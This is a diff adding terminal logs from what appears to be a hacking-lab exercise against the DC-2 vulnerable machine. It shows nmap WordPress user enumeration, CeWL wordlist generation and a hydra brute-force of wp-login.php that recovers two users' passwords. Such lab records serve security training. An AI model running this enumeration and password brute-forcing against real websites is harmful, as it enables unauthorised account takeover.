@@ -138,3 +138,37 @@ WordPress 4.2.2  2                                                            ht
                                                                                                                   
 __________________________________________________________________________________________________________________
 Time: 6.4 sec    Urls: 387                                                    Fingerprints: 39241      
+
+┌─[✗]─[user@parrot]─[~/hacking-lab-logs/DC2]
+└──╼ $sudo nmap -p80 --script http-wordpress-users $IP
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-21 14:30 JST
+Nmap scan report for dc-2 (192.168.56.110)
+Host is up (0.0017s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-wordpress-users: 
+| Username found: admin
+| Username found: tom
+| Username found: jerry
+|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
+MAC Address: 08:00:27:0B:F4:E8 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 3.79 seconds
+
+┌─[user@parrot]─[~/hacking-lab-logs/DC2]
+└──╼ $cewl -m 5 -w dict.txt http://dc-2
+CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+
+┌─[✗]─[user@parrot]─[~/hacking-lab-logs/DC2]
+└──╼ $hydra -L users.txt -P dict.txt dc-2 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=incorrect'
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-22 14:25:07
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 495 login tries (l:3/p:165), ~31 tries per task
+[DATA] attacking http-post-form://dc-2:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=incorrect
+[80][http-post-form] host: dc-2   login: jerry   password: adipiscing
+[STATUS] 421.00 tries/min, 421 tries in 00:01h, 74 to do in 00:01h, 16 active
+[80][http-post-form] host: dc-2   login: tom   password: parturient
+1 of 1 target successfully completed, 2 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-22 14:26:18
